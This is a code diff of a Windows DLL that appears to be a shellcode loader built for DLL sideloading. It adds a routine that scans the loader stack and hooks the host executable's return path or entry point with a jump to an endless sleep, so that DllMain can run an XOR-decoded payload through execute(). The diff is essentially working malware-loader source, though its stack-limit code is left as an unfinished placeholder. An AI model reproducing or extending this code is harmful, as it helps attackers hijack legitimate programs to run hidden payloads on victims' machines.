@@ -2,6 +2,8 @@
 #include <stdio.h>
 #include <winternl.h>
 #include <stdlib.h>
+#include <tlhelp32.h>
+#include <string>
 
 
 typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -9,6 +11,95 @@ typedef BOOL (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD f
 typedef HANDLE (WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 typedef VOID (WINAPI* fnSleep)(DWORD dwMilliseconds);
 
+
+void DoNothing() {
+    while (true) Sleep(10 * 1000);
+}
+
+void InstallHook(PVOID address, PVOID jump) {
+    BYTE Jump[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+    
+    DWORD old;
+    VirtualProtect(address, sizeof(Jump), PAGE_EXECUTE_READWRITE, &old);
+
+    memcpy(address, Jump, 12);
+    memcpy(((PBYTE)address + 2), &jump, 8);
+
+    VirtualProtect(address, sizeof(Jump), old, &old);
+}
+
+BOOL HookTheStack() {
+    // Get primary module info
+
+    PBYTE baseAddress = NULL;
+    DWORD baseSize = 0;
+
+    WCHAR fileName[MAX_PATH];
+    GetModuleFileNameW(NULL, fileName, MAX_PATH);
+    std::wstring pathString = std::wstring(fileName);
+
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
+
+    MODULEENTRY32W pEntry;
+    pEntry.dwSize = sizeof(pEntry);
+    BOOL hRes = Module32FirstW(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (pathString.find(pEntry.szModule) != std::wstring::npos) {
+            baseAddress = pEntry.modBaseAddr;
+            baseSize = pEntry.modBaseSize;
+            break;
+        }
+        hRes = Module32NextW(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+
+    if (!baseAddress || !baseSize)
+        return FALSE;
+
+    // Hunt the stack
+
+    PBYTE ldrLoadDll = (PBYTE)GetProcAddress(GetModuleHandleW(L"ntdll"), "LdrLoadDll");
+    PBYTE * stack = (PBYTE *)__builtin_return_address(0);
+    BOOL foundLoadDll = FALSE;
+
+    ULONG_PTR lowLimit = 0, highLimit = 0;
+    // Placeholder for GetCurrentThreadStackLimits, which is not available in MinGW
+    // You may need to implement this differently or use a fixed range
+
+    for (; (ULONG_PTR)stack < highLimit; stack++) {
+        if (*stack < (PBYTE)0x1000)
+            continue;
+
+        if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x1000) {
+            // LdrLoadDll is in the stack, let's start looking for our module
+            foundLoadDll = TRUE;
+        }
+
+        if (foundLoadDll && *stack > baseAddress && *stack < (baseAddress + baseSize)) {
+            MEMORY_BASIC_INFORMATION mInfo = { 0 };
+            VirtualQuery(*stack, &mInfo, sizeof(mInfo));
+
+            if (!(mInfo.Protect & PAGE_EXECUTE_READ))
+                continue;
+
+            // Primary module is in the stack, let's hook there
+            InstallHook(*stack, (PVOID)DoNothing);
+
+            return TRUE;
+        }
+    }
+
+    // No references found, let's just hook the entry point
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
+    PBYTE entryPoint = baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;
+
+    InstallHook(entryPoint, (PVOID)&DoNothing);
+    
+    return TRUE;
+}
 
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
     int j;
@@ -21,7 +112,6 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
         j++;
     }
 }
-
 
 LPCSTR ConvertUnsignedCharArrayToLPCSTR(const unsigned char* src, size_t src_len)
 {
@@ -36,7 +126,6 @@ LPCSTR ConvertUnsignedCharArrayToLPCSTR(const unsigned char* src, size_t src_len
     
     return bstr;
 }
-
 
 extern "C" {
     BOOL execute() {
@@ -113,17 +202,12 @@ BOOL APIENTRY DllMain( HMODULE hModule,
                        LPVOID lpReserved
                      )
 {
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-    {
-        execute();
-        break;
-    }
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
+    if (ul_reason_for_call != DLL_PROCESS_ATTACH)
+        return TRUE;
+
+    if (!HookTheStack())
+        return TRUE;
+
+    execute();
     return TRUE;
 }
